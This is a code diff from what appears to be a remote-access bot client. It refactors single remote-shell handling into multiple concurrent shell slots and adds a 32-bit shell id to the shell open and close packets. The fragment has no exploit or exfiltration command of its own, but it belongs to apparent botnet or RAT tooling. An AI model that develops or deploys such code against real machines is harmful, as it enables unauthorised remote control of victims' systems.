@@ -30,11 +30,11 @@ struct sLaika_peerPacketInfo laikaB_pktTbl[LAIKAPKT_MAXNONE] = {
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_OPEN,
         laikaB_handleShellOpen,
-        sizeof(uint16_t) + sizeof(uint16_t),
+        sizeof(uint32_t) + sizeof(uint16_t) + sizeof(uint16_t),
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_CLOSE,
         laikaB_handleShellClose,
-        0,
+        sizeof(uint32_t),
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
         laikaB_handleShellData,
@@ -57,6 +57,7 @@ struct sLaika_bot *laikaB_newBot(void) {
     struct hostent *host;
     char *tempINBuf;
     size_t _unused;
+    int i;
 
     laikaP_initPList(&bot->pList);
     bot->peer = laikaS_newPeer(
@@ -70,8 +71,12 @@ struct sLaika_bot *laikaB_newBot(void) {
     laikaT_initTaskService(&bot->tService);
     laikaT_newTask(&bot->tService, 5000, laikaB_pingTask, (void*)bot);
 
-    bot->shell = NULL;
+    /* init shells */
+    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
+        bot->shells[i] = NULL;
+    }
     bot->shellTask = NULL;
+    bot->activeShells = 0;
 
     /* generate keypair */
     if (sodium_init() < 0) {
@@ -114,9 +119,11 @@ struct sLaika_bot *laikaB_newBot(void) {
 void laikaB_freeBot(struct sLaika_bot *bot) {
     int i;
 
-    /* clear shell */
-    if (bot->shell)
-        laikaB_freeShell(bot, bot->shell);
+    /* clear shells */
+    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
+        if (bot->shells[i])
+            laikaB_freeShell(bot, bot->shells[i]);
+    }
 
     laikaP_cleanPList(&bot->pList);
     laikaS_freePeer(bot->peer);
